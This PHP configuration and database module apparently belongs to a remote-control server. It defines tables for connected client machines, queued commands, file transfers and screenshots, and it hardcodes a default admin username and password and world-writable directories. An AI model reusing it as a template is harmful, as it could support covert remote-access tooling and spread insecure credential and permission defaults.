<?php
define('DB_PATH', __DIR__ . '/database.db');

define('SERVER_HOST', '0.0.0.0');
define('SERVER_PORT', 8089);
define('MAX_CLIENTS', 100);

define('LOG_PATH', __DIR__ . '/logs/');
define('LOG_LEVEL', 'DEBUG');
define('LOG_MAX_SIZE', 10 * 1024 * 1024);

define('UPLOAD_PATH', __DIR__ . '/uploads/');
define('SCREENSHOT_PATH', __DIR__ . '/screenshots/');

foreach ([UPLOAD_PATH, SCREENSHOT_PATH, LOG_PATH] as $dir) {
    if (!is_dir($dir)) {
        @mkdir($dir, 0777, true);
    }
}

function getDB() {
    static $pdo = null;
    if ($pdo !== null) {
        return $pdo;
    }

    try {
        $pdo = new PDO('sqlite:' . DB_PATH);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        $pdo->setAttribute(PDO::ATTR_TIMEOUT, 30);
        $pdo->exec('PRAGMA journal_mode=WAL');
        $pdo->exec('PRAGMA busy_timeout=30000');
        $pdo->exec('PRAGMA synchronous=NORMAL');
        $pdo->exec('PRAGMA temp_store=MEMORY');

        initDatabase($pdo);
        try { $pdo->exec("ALTER TABLE clients ADD COLUMN hwid TEXT DEFAULT ''"); } catch (PDOException $e) {}

        $stmt = $pdo->query('SELECT COUNT(*) FROM admins');
        if ((int)$stmt->fetchColumn() === 0) {
            $hash = password_hash('1048879748', PASSWORD_DEFAULT);
            $pdo->prepare('INSERT INTO admins (username, password_hash) VALUES (?, ?)')
                ->execute(['Buyt', $hash]);
        }
    } catch (PDOException $e) {
        die('Database connection failed: ' . $e->getMessage());
    }

    return $pdo;
}

function getDatabase() {
    return getDB();
}

function isDatabaseLockedException($e) {
    if (!($e instanceof PDOException)) {
        return false;
    }

    $message = strtolower($e->getMessage());
    if (strpos($message, 'database is locked') !== false || strpos($message, 'database table is locked') !== false) {
        return true;
    }

    $info = $e->errorInfo ?? [];
    return isset($info[1]) && ((int)$info[1] === 5 || (int)$info[1] === 6);
}

function dbRunWithRetry(callable $callback, $retries = 12, $delayMs = 120) {
    $attempt = 0;
    while (true) {
        try {
            return $callback();
        } catch (PDOException $e) {
            if (!isDatabaseLockedException($e) || $attempt >= $retries) {
                throw $e;
            }
            usleep(($delayMs + ($attempt * 80)) * 1000);
            $attempt++;
        }
    }
}

function dbExecuteWithRetry(PDO $pdo, $sql, array $params = []) {
    return dbRunWithRetry(function () use ($pdo, $sql, $params) {
        $stmt = $pdo->prepare($sql);
        $stmt->execute($params);
        return $stmt;
    });
}

function dbQueryWithRetry(PDO $pdo, $sql) {
    return dbRunWithRetry(function () use ($pdo, $sql) {
        return $pdo->query($sql);
    });
}

function normalizeText($value) {
    if (!is_string($value) || $value === '') {
        return $value;
    }

    $s = trim($value);
    if ($s === '') {
        return $value;
    }

    $restored = @iconv('GB18030', 'UTF-8//IGNORE', @iconv('UTF-8', 'GB18030//IGNORE', $s));
    if (!is_string($restored) || $restored === '') {
        return $value;
    }

    $badPattern = '/[��鍙鎴蹇閸娑撶缁妫婢鐎]/u';
    $originalBad = preg_match_all($badPattern, $s, $m1);
    $restoredBad = preg_match_all($badPattern, $restored, $m2);

    if ($restoredBad < $originalBad) {
        return $restored;
    }

    return $value;
}

function normalizeData($data) {
    if (is_array($data)) {
        foreach ($data as $k => $v) {
            $data[$k] = normalizeData($v);
        }
        return $data;
    }

    if (is_string($data)) {
        return normalizeText($data);
    }

    return $data;
}

function initDatabase(PDO $pdo) {
    $sql = <<<'SQL'
CREATE TABLE IF NOT EXISTS clients (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    client_id TEXT UNIQUE NOT NULL,
    hostname TEXT DEFAULT '',
    ip_address TEXT NOT NULL,
    port INTEGER DEFAULT 0,
    os_info TEXT,
    cpu_info TEXT,
    ram_total INTEGER DEFAULT 0,
    hwid TEXT DEFAULT '',
    status TEXT DEFAULT 'online' CHECK(status IN ('online', 'offline')),
    first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_seen DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_clients_status ON clients(status);
CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen);

CREATE TABLE IF NOT EXISTS command_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    client_id TEXT NOT NULL,
    command_type TEXT NOT NULL,
    command_data TEXT,
    response_data TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE
);
CREATE INDEX IF NOT EXISTS idx_command_logs_client_id ON command_logs(client_id);
CREATE INDEX IF NOT EXISTS idx_command_logs_created_at ON command_logs(created_at);

CREATE TABLE IF NOT EXISTS file_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    client_id TEXT NOT NULL,
    operation TEXT NOT NULL,
    file_path TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE
);
CREATE INDEX IF NOT EXISTS idx_file_logs_client_id ON file_logs(client_id);

CREATE TABLE IF NOT EXISTS screenshots (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    client_id TEXT NOT NULL,
    image_path TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE
);
CREATE INDEX IF NOT EXISTS idx_screenshots_client_id ON screenshots(client_id);

CREATE TABLE IF NOT EXISTS admins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    admin_id INTEGER NOT NULL,
    token TEXT UNIQUE NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    expires_at DATETIME NOT NULL,
    FOREIGN KEY (admin_id) REFERENCES admins(id) ON DELETE CASCADE
);
CREATE INDEX IF NOT EXISTS idx_sessions_token ON sessions(token);
CREATE INDEX IF NOT EXISTS idx_sessions_expires ON sessions(expires_at);

CREATE TABLE IF NOT EXISTS system_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    level TEXT NOT NULL CHECK(level IN ('DEBUG', 'INFO', 'WARNING', 'ERROR')),
    message TEXT NOT NULL,
    context TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_system_logs_level ON system_logs(level);
CREATE INDEX IF NOT EXISTS idx_system_logs_created_at ON system_logs(created_at);

CREATE TABLE IF NOT EXISTS commands (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    client_id TEXT NOT NULL,
    command TEXT NOT NULL,
    params TEXT,
    status TEXT DEFAULT 'pending' CHECK(status IN ('pending', 'sent', 'completed', 'failed')),
    result TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    executed_at DATETIME,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE
);
CREATE INDEX IF NOT EXISTS idx_commands_client_id ON commands(client_id);
CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status);

CREATE TABLE IF NOT EXISTS download_progress (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    client_id TEXT NOT NULL,
    command_id INTEGER NOT NULL,
    path TEXT NOT NULL,
    total_chunks INTEGER DEFAULT 0,
    received_chunks INTEGER DEFAULT 0,
    total_bytes INTEGER DEFAULT 0,
    status TEXT DEFAULT 'downloading' CHECK(status IN ('downloading', 'complete', 'failed')),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
SQL;

    $pdo->exec($sql);
}

class Logger {
    private static $instance = null;
    private $logFile;
    private $db;

    const LEVEL_DEBUG = 'DEBUG';
    const LEVEL_INFO = 'INFO';
    const LEVEL_WARNING = 'WARNING';
    const LEVEL_ERROR = 'ERROR';

    private $levels = [
        self::LEVEL_DEBUG => 0,
        self::LEVEL_INFO => 1,
        self::LEVEL_WARNING => 2,
        self::LEVEL_ERROR => 3,
    ];

    private function __construct() {
        $this->logFile = LOG_PATH . 'server_' . date('Y-m-d') . '.log';
        $this->db = getDB();
        $this->rotateLog();
    }

    public static function getInstance() {
        if (self::$instance === null) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    private function rotateLog() {
        if (file_exists($this->logFile) && filesize($this->logFile) > LOG_MAX_SIZE) {
            @rename($this->logFile, $this->logFile . '.' . time());
        }
    }

    private function shouldLog($level) {
        $configLevel = defined('LOG_LEVEL') ? LOG_LEVEL : self::LEVEL_DEBUG;
        return ($this->levels[$level] ?? 0) >= ($this->levels[$configLevel] ?? 0);
    }

    public function log($level, $message, $context = []) {
        if (!$this->shouldLog($level)) {
            return;
        }

        $timestamp = date('Y-m-d H:i:s');
        $contextStr = !empty($context) ? json_encode($context, JSON_UNESCAPED_UNICODE) : '';
        $logLine = sprintf("[%s] [%s] %s %s\n", $timestamp, $level, $message, $contextStr);
        @file_put_contents($this->logFile, $logLine, FILE_APPEND);

        try {
            dbExecuteWithRetry($this->db, 'INSERT INTO system_logs (level, message, context) VALUES (?, ?, ?)', [$level, $message, $contextStr]);
        } catch (PDOException $e) {}

        if (php_sapi_name() === 'cli') {
            $this->consoleOutput($level, $timestamp, $message);
        }
    }

    private function consoleOutput($level, $timestamp, $message) {
        $colors = [
            self::LEVEL_DEBUG => "\033[36m",
            self::LEVEL_INFO => "\033[32m",
            self::LEVEL_WARNING => "\033[33m",
            self::LEVEL_ERROR => "\033[31m",
        ];
        $reset = "\033[0m";
        $color = $colors[$level] ?? $reset;
        echo "{$color}[{$timestamp}] [{$level}] {$message}{$reset}\n";
    }

    public function debug($message, $context = []) { $this->log(self::LEVEL_DEBUG, $message, $context); }
    public function info($message, $context = []) { $this->log(self::LEVEL_INFO, $message, $context); }
    public function warning($message, $context = []) { $this->log(self::LEVEL_WARNING, $message, $context); }
    public function error($message, $context = []) { $this->log(self::LEVEL_ERROR, $message, $context); }

    public static function getLogFiles() {
        $files = glob(LOG_PATH . 'server_*.log*') ?: [];
        return array_map('basename', $files);
    }

    public static function readLog($filename, $lines = 100) {
        $filepath = LOG_PATH . basename($filename);
        if (!is_file($filepath)) {
            return [];
        }

        $file = new SplFileObject($filepath);
        $file->seek(PHP_INT_MAX);
        $totalLines = $file->key();
        $file->seek(max(0, $totalLines - $lines));

        $logs = [];
        while (!$file->eof()) {
            $line = $file->current();
            if (trim($line) !== '') {
                $logs[] = $line;
            }
            $file->next();
        }
        return $logs;
    }
}

